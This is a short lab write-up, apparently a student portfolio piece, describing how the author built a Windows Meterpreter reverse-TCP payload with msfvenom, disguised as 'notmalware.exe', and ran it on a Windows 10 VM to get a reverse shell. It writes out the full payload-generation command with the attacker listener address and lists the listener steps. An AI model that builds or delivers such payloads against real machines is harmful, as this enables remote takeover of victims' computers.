# Creating Malware in Metasploit

<h2>Description</h2>
In this task, I created a malware in metasploit and executed it on a windows 10 vm to establish a reverse shell connection. 


<h2>Languages and Utilities Used</h2>

- <b>Metasploit</b>
- <b>linux CLI</b>


<h2>Environments Used </h2>

- <b>Unbuntu</b>
- <b>Windows 10 Enterprise</b> 

<br />
<br />
Install and run metasploit.

![1) install and configure metasploit](https://github.com/user-attachments/assets/55d98dd1-6f77-4ebb-9e3b-f839a4c5be73)

<br />
<br />
Creating the malware with msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f exe -o notmalware.exe. Explained) msfvenom is the command-line payload generator and encoder for Metasploit, -p windows/meterpreter/reverse_tcp specifies a Windows-based Meterpreter payload that uses a reverse TCP connection, LHOST=192.168.1.4 sets the IP address of the attacker's machine (listener) to which the payload will connect back, LPORT=4444 sets the port number on the attacker's machine that will be listening for the incoming connection, -f exe specifies the output format of the payload, in this case, an executable file, -o notmalware.exe sets the output file name for the generated payload.
![2) malware created with msfvenom](https://github.com/user-attachments/assets/5529f4f9-902b-49f6-be6f-24ca4210139e)

<br />
<br />  
Run use exploit/multi/handler, set Payload, set LHOST, set LPOT, then exploit. 

![3) listener setup and execute](https://github.com/user-attachments/assets/f1723433-3b25-4bcb-b2f9-71d45093551d)

<br />
<br />
Create a server to host the payload using python3.

![4) seting up server to download payload](https://github.com/user-attachments/assets/e5588184-e555-4a44-ba22-2f814953c2b4)

<br />
<br />
Download payload from python server.

![5) downloading malware on windows vm](https://github.com/user-attachments/assets/a2b3433c-f772-47f3-b21b-d5121c1a44dc)

<br />
<br />
I used the cmd as admin to execute the payload. 

![6) executing notmalware on windows](https://github.com/user-attachments/assets/14671882-e563-4efd-97b8-c225130aee01)

<br />
<br />
Ubuntu VM shows reverse tcp connection. 

![7) reverse shell started](https://github.com/user-attachments/assets/a4ac124d-f19f-4c8c-a92b-3285fc569742)

<br />
<br />  
